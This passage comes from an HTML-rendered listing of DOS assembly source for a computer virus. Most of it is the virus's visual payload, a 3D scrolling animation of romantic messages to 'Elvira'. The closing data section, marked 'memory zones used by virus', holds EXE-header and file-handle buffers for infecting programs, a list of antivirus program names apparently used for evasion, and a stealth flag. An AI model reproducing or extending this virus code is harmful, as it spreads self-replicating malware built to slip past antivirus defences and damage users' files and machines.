</span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msg_bombe</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
</span><span class="sc5">affiche_message</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">               </span><span class="sc1">;second line is empty</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">pas_ligne_3</span><span class="sc0">

</span><span class="sc1">; 2/ put cursor to good coordinates</span><span class="sc0">

</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">02h</span><span class="sc0">
</span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
                        
</span><span class="sc1">; 3/ write one line</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">23</span><span class="sc0">
</span><span class="sc5">affiche_ligne</span><span class="sc4">:</span><span class="sc0">
    </span><span class="sc6">lodsb</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Eh</span><span class="sc0">
    </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
</span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">affiche_ligne</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">

</span><span class="sc5">pas_ligne_3</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">affiche_message</span><span class="sc0">

</span><span class="sc1">;--------------initialize segments-----------------------</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0A000h</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">32</span><span class="sc0">              </span><span class="sc1">;data will be on a stock segment far</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">              </span><span class="sc1">;away from actual code</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">                 </span><span class="sc1">;on stack (cf [@@] + bas)</span><span class="sc0">

</span><span class="sc1">;-------------creation of the table (x,z) NB: y constant--------------</span><span class="sc0">
</span><span class="sc1">;here ds=video  es=stock</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc5">largeur</span><span class="sc4">*</span><span class="sc5">profondeur</span><span class="sc4">)</span><span class="sc0">    </span><span class="sc1">;255*40 coordinates</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">                      </span><span class="sc1">;start of video screen</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">                      </span><span class="sc1">;start of stock zone</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">                      </span><span class="sc1">;end line counter</span><span class="sc0">

</span><span class="sc5">table</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">              </span><span class="sc1">;X: 0&lt;bl&lt;255</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">128</span><span class="sc0">             </span><span class="sc1">;center it</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc0">              </span><span class="sc1">;-128&lt;al&lt;128</span><span class="sc0">
</span><span class="sc6">stosb</span><span class="sc0">                   </span><span class="sc1">;stock X</span><span class="sc0">

</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">                  </span><span class="sc1">;now, COLOR</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">               </span><span class="sc1">;end of line?</span><span class="sc0">
</span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">pas_fin_de_ligne</span><span class="sc0">    </span><span class="sc1">;yes if dl=0</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">319</span><span class="sc4">-</span><span class="sc5">largeur</span><span class="sc0">     </span><span class="sc1">;so =&gt; next video line</span><span class="sc0">
</span><span class="sc5">pas_fin_de_ligne</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc1">;not end of line</span><span class="sc0">
</span><span class="sc6">movsb</span><span class="sc0">                   </span><span class="sc1">;stock COLOR</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">              </span><span class="sc1">;Z: 0&lt;ax&lt;40*255</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">              </span><span class="sc1">;0&lt;ah&lt;40</span><span class="sc0">
</span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">             </span><span class="sc1">;0&lt;al&lt;40</span><span class="sc0">
</span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">               </span><span class="sc1">;0&lt;al&lt;80</span><span class="sc0">
</span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">               </span><span class="sc1">;0&lt;al&lt;160</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                  </span><span class="sc1">;1&lt;ax&lt;161 to avoid div by 0</span><span class="sc0">
</span><span class="sc6">stosw</span><span class="sc0">                   </span><span class="sc1">;stock Z</span><span class="sc0">

</span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">table</span><span class="sc0">

</span><span class="sc1">;-------------------animation of letters-----------------------------</span><span class="sc0">
</span><span class="sc1">;here ds=video, es=stock</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc0">                         </span><span class="sc1">;es=video now</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">                         </span><span class="sc1">;ds to stock segment (cf [@@])</span><span class="sc0">
</span><span class="sc5">anime</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">;***********************</span><span class="sc0">
    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">3dah</span><span class="sc0">   </span><span class="sc1">;*</span><span class="sc0">
</span><span class="sc5">VRT</span><span class="sc4">:</span><span class="sc0">                  </span><span class="sc1">;*</span><span class="sc0">
    </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">     </span><span class="sc1">;*</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">      </span><span class="sc1">;*</span><span class="sc0">
    </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">VRT</span><span class="sc0">       </span><span class="sc1">;*   wait vertical retrace</span><span class="sc0">
              </span><span class="sc1">;*   to avoid flicking</span><span class="sc0">
</span><span class="sc5">NoVRT</span><span class="sc4">:</span><span class="sc0">                </span><span class="sc1">;*</span><span class="sc0">
    </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">     </span><span class="sc1">;*</span><span class="sc0">
    </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">      </span><span class="sc1">;*</span><span class="sc0">
    </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">NoVRT</span><span class="sc0">     </span><span class="sc1">;*</span><span class="sc0">
</span><span class="sc1">;***********************</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">largeur</span><span class="sc4">*</span><span class="sc5">profondeur</span><span class="sc0">              </span><span class="sc1">;we will draw 255*40 points</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">                              </span><span class="sc1">;ds:si=coordinates stock</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">                              </span><span class="sc1">;es:di=video</span><span class="sc0">
</span><span class="sc5">dessine</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">lodsw</span><span class="sc0">                                   </span><span class="sc1">;X and color in ax</span><span class="sc0">
</span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">                             </span><span class="sc1">;now in bx</span><span class="sc0">
</span><span class="sc6">lodsw</span><span class="sc0">                                   </span><span class="sc1">;Z in ax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">z</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">       </span><span class="sc1">;Z into a temp buffer</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">128</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc5">profondeur</span><span class="sc4">)</span><span class="sc0">              </span><span class="sc1">;point is too far?</span><span class="sc0">
</span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">ca_sort_pas</span><span class="sc0">                          </span><span class="sc1">;no =&gt; OK</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">200</span><span class="sc0">                             </span><span class="sc1">;yes =&gt; put it at the front</span><span class="sc0">
</span><span class="sc5">ca_sort_pas</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                                  </span><span class="sc1">;increment distance</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">              </span><span class="sc1">;stock new Z</span><span class="sc0">

</span><span class="sc1">;----------calculate xx et yy (screen) from x, y, z (3D)-------------</span><span class="sc0">
</span><span class="sc1">;optimization using bl as X and color as bh</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">                          </span><span class="sc1">;save counter</span><span class="sc0">
</span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc0">                      </span><span class="sc1">;get X in ah</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc0">                       </span><span class="sc1">;bl used to remember sign</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">128</span><span class="sc0">                      </span><span class="sc1">;X positive?</span><span class="sc0">
</span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">suite5</span><span class="sc0">                        </span><span class="sc1">;yes =&gt; OK</span><span class="sc0">
</span><span class="sc6">neg</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc0">                           </span><span class="sc1">;no =&gt; let's positivize it</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc0">                           </span><span class="sc1">;and we remember it was negative</span><span class="sc0">
</span><span class="sc5">suite5</span><span class="sc4">:</span><span class="sc0">                          </span><span class="sc1">;NB: calculations in fixed point mode</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">                       </span><span class="sc1">;X is in ah, same order than Z</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">                       </span><span class="sc1">;dx will not fuck my div</span><span class="sc0">
</span><span class="sc6">div</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">z</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;div X by Z</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                          </span><span class="sc1">;result is coordinate 2D (XX)</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">60</span><span class="sc0">                       </span><span class="sc1">;Y is backside, altitude 60 = ground</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">                       </span><span class="sc1">;Y is in ah, same order than Z</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">                       </span><span class="sc1">;i said dx will not fuck my div</span><span class="sc0">
</span><span class="sc6">div</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">z</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;div Y by Z</span><span class="sc0">
</span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                      </span><span class="sc1">;result is coordinate 2D (YY)</span><span class="sc0">

</span><span class="sc1">;-------calculate video offset of points from XX and YY--------------</span><span class="sc0">
</span><span class="sc1">;optimization using cx as YY and XX on stack</span><span class="sc0">
</span><span class="sc1">;color is in bh, sign in bl</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">                           </span><span class="sc1">;get XX from stack</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">170</span><span class="sc0">                      </span><span class="sc1">;too much at the bottom: no plot</span><span class="sc0">
</span><span class="sc6">ja</span><span class="sc0"> </span><span class="sc5">pas_plot</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">156</span><span class="sc0">                      </span><span class="sc1">;too much on sides: no plot</span><span class="sc0">
</span><span class="sc6">ja</span><span class="sc0"> </span><span class="sc5">pas_plot</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">                          </span><span class="sc1">;XX loves the stack</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc0">                      </span><span class="sc1">;screen width</span><span class="sc0">
</span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">                           </span><span class="sc1">;multiply YY by width</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">                           </span><span class="sc1">;XX from stack to dx</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                        </span><span class="sc1">;X and XX negative?</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">pos</span><span class="sc0"> 
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">                       </span><span class="sc1">;yes =&gt; substract XX from ax</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">suite4</span><span class="sc0">
</span><span class="sc5">pos</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">                       </span><span class="sc1">;non =&gt; add XX to ax</span><span class="sc0">

</span><span class="sc5">suite4</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">320</span><span class="sc4">*</span><span class="sc2">30</span><span class="sc4">)+</span><span class="sc2">160</span><span class="sc0">             </span><span class="sc1">;add screen height</span><span class="sc0">

</span><span class="sc1">;--------calculate color of point (shade effect)------------------</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                       </span><span class="sc1">;ax is video offset of point</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                          </span><span class="sc1">;on stack</span><span class="sc0">
</span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc0">                        </span><span class="sc1">;black point?</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">eteindre</span><span class="sc0">                      </span><span class="sc1">;yes =&gt; bypass shading routine</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">z</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">;128&lt;bx&lt;328</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">                          </span><span class="sc1">;divide it by 16</span><span class="sc0">
</span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">                         </span><span class="sc1">;8&lt;bx&lt;20</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">36</span><span class="sc0">                         </span><span class="sc1">;default B&amp;W colors (31=white,16=black)</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc0">                         </span><span class="sc1">;16&lt;al&lt;28</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">pas_eteindre</span><span class="sc0">
</span><span class="sc5">eteindre</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">                         </span><span class="sc1">;color black</span><span class="sc0">
</span><span class="sc5">pas_eteindre</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">;--------calculate point size------------------</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">                  </span><span class="sc1">;get point offset</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc4">*</span><span class="sc2">100</span><span class="sc0">         </span><span class="sc1">;above line 100?</span><span class="sc0">
</span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">fond</span><span class="sc0">                 </span><span class="sc1">;yes =&gt; little point (far)</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc4">*</span><span class="sc2">151</span><span class="sc0">         </span><span class="sc1">;above line 153?</span><span class="sc0">
</span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">moyen</span><span class="sc0">                </span><span class="sc1">;yes =&gt; middle point</span><span class="sc0">

</span><span class="sc5">proche</span><span class="sc4">:</span><span class="sc0">                 </span><span class="sc1">;other case =&gt; big point (near)</span><span class="sc0">
</span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">320</span><span class="sc4">-</span><span class="sc2">3</span><span class="sc0">           </span><span class="sc1">;big = 2 lines of 3 pixels</span><span class="sc0">
</span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">pas_plot</span><span class="sc0">

</span><span class="sc5">moyen</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">stosb</span><span class="sc0">                   </span><span class="sc1">;middle = 2 pixels</span><span class="sc0">
</span><span class="sc5">fond</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">stosb</span><span class="sc0">                   </span><span class="sc1">;little = 1 pixel</span><span class="sc0">

</span><span class="sc5">pas_plot</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">                    </span><span class="sc1">;get back counter</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">                    </span><span class="sc1">;one more point</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">suite9</span><span class="sc0">                 </span><span class="sc1">;end of screen?</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">dessine</span><span class="sc0">               </span><span class="sc1">;no =&gt; next point</span><span class="sc0">
</span><span class="sc5">suite9</span><span class="sc4">:</span><span class="sc0">
    
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">anime</span><span class="sc0">                </span><span class="sc1">;yes =&gt; next screen</span><span class="sc0">

</span><span class="sc1">;-----------memory zones used for graphic effect------------</span><span class="sc0">

</span><span class="sc5">msg_bombe</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"       ELVIRA !        "</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">" Black and White Girl  "</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"     from Paris        "</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"You make me feel alive."</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"Pars. Reviens. Respire."</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"     Puis repars.      "</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">" J'aime ton mouvement. "</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">" Bruja con ojos verdes "</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">" Eres un grito de vida,"</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">" un canto de libertad. "</span><span class="sc0">

</span><span class="sc5">z</span><span class="sc0"> </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc1">;************ memory zones used by virus********************</span><span class="sc0">

</span><span class="sc5">win4octets</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">90h</span><span class="sc0">
</span><span class="sc5">f_ext</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0EEh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0EEh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0EEh</span><span class="sc0">
</span><span class="sc5">f_attrib</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0AAh</span><span class="sc0">
</span><span class="sc5">f_name</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">f_time</span><span class="sc0">          </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">f_date</span><span class="sc0">          </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">f_handle</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">exehead</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">1Ch</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">0aah</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">av_liste</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"TBVIAVNAVSFIF-FVIVDRSCGUCO"</span><span class="sc0">
</span><span class="sc5">zip_liste</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"PKARRALHBA"</span><span class="sc0">
</span><span class="sc5">stealth_non</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
